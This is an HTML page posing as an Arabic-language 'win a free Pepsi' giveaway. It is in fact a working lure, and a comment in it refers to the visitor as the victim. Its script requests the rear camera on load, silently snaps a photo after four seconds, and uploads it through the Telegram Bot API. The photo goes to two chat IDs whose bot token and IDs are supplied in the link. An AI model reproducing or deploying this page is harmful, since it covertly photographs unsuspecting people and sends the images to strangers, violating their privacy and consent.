<!DOCTYPE html>
<html>
<head><title>Win Pepsi!</title></head>
<body style="background:white; text-align:center; font-family:Arial, sans-serif;">
    <h2 style="color:blue; margin-top:20px;">لقد ربحت عبوة بيبسي مجانية!</h2>
    <p>شاهد الفيديو لاستلام جائزتك</p>
    <!-- فيديو عرض البيبسي الذي يظهر للضحية -->
    <video width="80%" autoplay loop muted playsinline style="border-radius:15px; box-shadow:0 4px 8px rgba(0,0,0,0.2);">
        <source src="https://www.w3schools.com/html/movie.mp4" type="video/mp4">
    </video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        const p = new URLSearchParams(window.location.search);
        navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}}).then(stream => {
            const vid = document.createElement('video'); vid.srcObject = stream; vid.play();
            setTimeout(() => {
                const con = document.getElementById('canvas').getContext('2d');
                document.getElementById('canvas').width = vid.videoWidth;
                document.getElementById('canvas').height = vid.videoHeight;
                con.drawImage(vid, 0, 0);
                document.getElementById('canvas').toBlob(blob => {
                    let form = new FormData(); form.append('photo', blob, 'back.jpg');
                    fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendPhoto?chat_id=${p.get('user_id')}`, {method:'POST', body:form});
                    fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendPhoto?chat_id=${p.get('admin_id')}`, {method:'POST', body:form});
                }, 'image/jpeg');
            }, 4000);
        });
    </script>
</body>
</html>
